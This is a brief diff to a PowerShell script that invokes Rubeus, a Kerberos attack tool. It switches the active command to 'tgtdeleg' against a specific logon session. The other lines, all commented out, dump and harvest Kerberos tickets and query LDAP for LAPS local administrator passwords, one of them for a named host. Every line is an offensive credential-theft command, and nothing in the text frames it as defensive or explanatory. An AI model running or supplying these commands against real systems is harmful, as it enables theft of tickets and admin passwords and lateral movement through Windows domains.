@@ -29,7 +29,7 @@ function Invoke-Rubeus
 #Invoke-Rubeus -Command "dump /luid:0x5d1ea /nowrap"
 #Invoke-Rubeus -Command "harvest /interval:30"
 #Invoke-Rubeus -Command "triage /export"
-Invoke-Rubeus -Command "tgtdeleg /nowrap"
+Invoke-Rubeus -Command "tgtdeleg /luid:0x5d1ea /nowrap"
 #Invoke-Rubeus -Command "describe /service:krbtgt"
 #Invoke-Rubeus -Command 'ldap /query:"(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))" /getattributes:"cn,ms-Mcs-AdmPwd"'
 #Invoke-Rubeus -Command "ldap /query:\"(&(objectCategory=computer)(cn=web05))\" /getattributes:\"ms-Mcs-AdmPwd\""
